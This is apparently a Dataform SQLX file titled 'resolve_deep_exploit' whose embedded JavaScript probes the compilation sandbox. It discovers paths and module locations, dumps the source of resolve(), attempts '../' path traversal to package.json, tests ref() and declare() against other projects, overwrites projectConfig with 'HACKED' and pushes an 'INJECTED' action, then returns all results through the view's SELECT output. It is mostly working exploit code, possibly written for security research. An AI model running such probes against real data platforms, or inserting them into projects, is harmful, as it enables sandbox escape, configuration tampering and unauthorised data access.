config { type: "view", name: "resolve_deep_exploit" }

js {
  let r = { t: new Date().toISOString() };

  // TEST 1: CWD Discovery
  try {
    r.cwd = {};
    if (typeof process !== 'undefined') {
      try { r.cwd.processCwd = process.cwd(); } catch(e) { r.cwd.processCwd = e.message.substring(0, 50); }
    }
    if (typeof __dirname !== 'undefined') r.cwd.__dirname = __dirname;
    if (typeof __filename !== 'undefined') r.cwd.__filename = __filename;
    if (typeof module !== 'undefined') {
      r.cwd.moduleFilename = module.filename;
      r.cwd.modulePath = module.path;
    }
    if (typeof require !== 'undefined' && require.main) {
      r.cwd.requireMainFilename = require.main.filename;
    }
    if (typeof dataform !== 'undefined') {
      r.cwd.rootDir = dataform.rootDir;
      r.cwd.rootDirType = typeof dataform.rootDir;
    }
  } catch(e) { r.cwd = { err: e.message.substring(0, 100) }; }

  // TEST 2: resolve() signature
  try {
    if (typeof resolve === 'function') {
      r.resolveSig = {
        len: resolve.length,
        src: resolve.toString().substring(0, 300)
      };
      // Test arg counts
      try { r.resolveSig.noArgs = String(resolve()).substring(0, 100); } catch(e) { r.resolveSig.noArgs = "E:" + e.message.substring(0, 50); }
      try { r.resolveSig.oneArg = String(resolve('simple_test')).substring(0, 100); } catch(e) { r.resolveSig.oneArg = "E:" + e.message.substring(0, 50); }
      try { r.resolveSig.twoArgs = String(resolve('simple_test', 'definitions')).substring(0, 100); } catch(e) { r.resolveSig.twoArgs = "E:" + e.message.substring(0, 50); }
    }
  } catch(e) { r.resolveSig = { err: e.message.substring(0, 100) }; }

  // TEST 3: Path oracle - known paths
  try {
    r.pathOracle = {};
    const knownPaths = ['simple_test', 'resolve_deep_exploit', './simple_test', 'definitions/simple_test'];
    for (const p of knownPaths) {
      try {
        const res = resolve(p);
        r.pathOracle[p] = { r: String(res).substring(0, 100), empty: res === '' || res === undefined };
      } catch(e) { r.pathOracle[p] = { e: e.message.substring(0, 50) }; }
    }
  } catch(e) { r.pathOracle = { err: e.message.substring(0, 100) }; }

  // TEST 4: Traversal with various depths
  try {
    r.traversal = {};
    for (let d = 1; d <= 10; d++) {
      const path = '../'.repeat(d) + 'package.json';
      try {
        const res = resolve(path);
        r.traversal['d' + d] = { r: String(res).substring(0, 50), empty: !res };
      } catch(e) { r.traversal['d' + d] = { e: e.message.substring(0, 30) }; }
    }
  } catch(e) { r.traversal = { err: e.message.substring(0, 100) }; }

  // TEST 5: ref() cross-project
  try {
    r.refCross = {};
    const refs = [
      'simple_test',
      'bigquery-public-data.samples.shakespeare',
      'INFORMATION_SCHEMA.TABLES',
      'shir-research-3.INFORMATION_SCHEMA.TABLES'
    ];
    for (const x of refs) {
      try {
        const res = ref(x);
        r.refCross[x.substring(0, 30)] = { r: String(res).substring(0, 100), ok: true };
      } catch(e) { r.refCross[x.substring(0, 30)] = { e: e.message.substring(0, 50) }; }
    }
  } catch(e) { r.refCross = { err: e.message.substring(0, 100) }; }

  // TEST 6: require.resolve paths
  try {
    r.reqResolve = {};
    if (typeof require !== 'undefined' && typeof require.resolve === 'function') {
      const mods = ['@dataform/core', '.', '..', './simple_test'];
      for (const m of mods) {
        try {
          r.reqResolve[m] = require.resolve(m);
        } catch(e) { r.reqResolve[m] = "E:" + e.message.substring(0, 50); }
      }
      if (require.resolve.paths) {
        r.reqResolve.paths = require.resolve.paths('@dataform/core');
      }
    }
  } catch(e) { r.reqResolve = { err: e.message.substring(0, 100) }; }

  // TEST 7: dataform.actions enumeration
  try {
    r.actions = {};
    if (dataform && dataform.actions) {
      r.actions.count = dataform.actions.length;
      r.actions.names = dataform.actions.slice(0, 10).map(a => a.name);
      r.actions.configPaths = dataform.actions.slice(0, 5).map(a => a.configPath);
    }
  } catch(e) { r.actions = { err: e.message.substring(0, 100) }; }

  // TEST 8: Modify dataform.projectConfig?
  try {
    r.configMod = {};
    if (dataform && dataform.projectConfig) {
      r.configMod.frozen = Object.isFrozen(dataform.projectConfig);
      r.configMod.sealed = Object.isSealed(dataform.projectConfig);
      const orig = dataform.projectConfig.defaultDatabase;
      try {
        dataform.projectConfig.defaultDatabase = "HACKED";
        r.configMod.modified = dataform.projectConfig.defaultDatabase === "HACKED";
        dataform.projectConfig.defaultDatabase = orig;
      } catch(e) { r.configMod.modErr = e.message.substring(0, 50); }
    }
  } catch(e) { r.configMod = { err: e.message.substring(0, 100) }; }

  // TEST 9: Can we push to dataform.actions?
  try {
    r.actionPush = {};
    if (dataform && Array.isArray(dataform.actions)) {
      const len = dataform.actions.length;
      try {
        dataform.actions.push({ name: 'INJECTED', type: 'view' });
        r.actionPush.pushed = dataform.actions.length > len;
        r.actionPush.newLen = dataform.actions.length;
      } catch(e) { r.actionPush.pushErr = e.message.substring(0, 50); }
    }
  } catch(e) { r.actionPush = { err: e.message.substring(0, 100) }; }

  // TEST 10: declare() cross-project
  try {
    r.declareCross = {};
    if (typeof declare === 'function') {
      try {
        const d = declare({ database: "bigquery-public-data", schema: "samples", name: "shakespeare" });
        r.declareCross.publicData = { ok: true, type: typeof d };
      } catch(e) { r.declareCross.publicData = { e: e.message.substring(0, 50) }; }
    }
  } catch(e) { r.declareCross = { err: e.message.substring(0, 100) }; }
}

SELECT '${JSON.stringify(r)}' as resolve_deep_exploit
